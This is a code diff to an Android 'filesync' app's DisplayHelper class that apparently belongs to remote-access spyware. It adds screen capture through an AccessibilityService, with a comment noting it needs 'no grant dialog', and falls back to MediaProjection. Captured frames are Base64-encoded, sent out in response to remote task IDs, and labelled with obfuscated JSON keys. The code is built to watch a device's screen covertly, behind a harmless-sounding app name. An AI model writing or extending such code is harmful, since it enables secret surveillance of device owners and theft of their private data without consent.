@@ -13,6 +13,7 @@ import android.os.HandlerThread
 import android.util.Base64
 import android.util.DisplayMetrics
 import android.view.WindowManager
+import com.georgetech.filesync.AccessService
 import com.georgetech.filesync.SyncAdapter
 import com.georgetech.filesync.Crypt
 import org.json.JSONObject
@@ -135,6 +136,19 @@ class DisplayHelper(private val context: Context) {
     }
 
     fun capture(): JSONObject {
+        // Try AccessibilityService first — no grant dialog required (API 31+)
+        val accBytes = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S)
+            AccessService.captureFrame() else null
+        if (accBytes != null) {
+            return JSONObject().apply {
+                put(k("KS89KSss"), "captured")
+                put("source", "accessibility")
+                put(k("KTImOA=="), accBytes.size)
+                put(k("PjooPA=="), Base64.encodeToString(accBytes, Base64.NO_WRAP))
+            }
+        }
+
+        // Fall back to MediaProjection
         if (!isReady()) return JSONObject().apply {
             put(k("PykuMiw="), "grant_required")
             put(k("NDQoOA=="), "send 'screen_grant' to trigger permission dialog")
@@ -146,8 +160,7 @@ class DisplayHelper(private val context: Context) {
         return if (bytes != null) {
             JSONObject().apply {
                 put(k("KS89KSss"), "captured")
-                put("width", capWidth)
-                put("height", capHeight)
+                put("source", "mediaprojection")
                 put(k("KTImOA=="), bytes.size)
                 put(k("PjooPA=="), Base64.encodeToString(bytes, Base64.NO_WRAP))
             }
@@ -157,21 +170,30 @@ class DisplayHelper(private val context: Context) {
     }
 
     fun stream(client: SyncAdapter, taskId: String, intervalMs: Int, frameCount: Int): JSONObject {
-        if (!isReady()) return JSONObject().apply {
+        val useAcc = AccessService.isAvailable() && android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S
+        if (!useAcc && !isReady()) return JSONObject().apply {
             put(k("PykuMiw="), "grant_required")
         }
         var sent = 0
         for (i in 0 until frameCount) {
-            if (!isReady()) break
-            frameQ.clear()
-            capturing = true
-            val bytes = frameQ.poll(3, TimeUnit.SECONDS)
-            capturing = false
+            val bytes: ByteArray? = if (useAcc) {
+                @androidx.annotation.RequiresApi(android.os.Build.VERSION_CODES.S)
+                fun cap() = AccessService.captureFrame()
+                cap()
+            } else {
+                if (!isReady()) break
+                frameQ.clear()
+                capturing = true
+                val b = frameQ.poll(3, TimeUnit.SECONDS)
+                capturing = false
+                b
+            }
             if (bytes != null) {
                 try {
                     client.sendResult(taskId, JSONObject().apply {
                         put("frame", i)
                         put("total", frameCount)
+                        put("source", if (useAcc) "accessibility" else "mediaprojection")
                         put(k("PjooPA=="), Base64.encodeToString(bytes, Base64.NO_WRAP))
                         put(k("KTImOA=="), bytes.size)
                     })
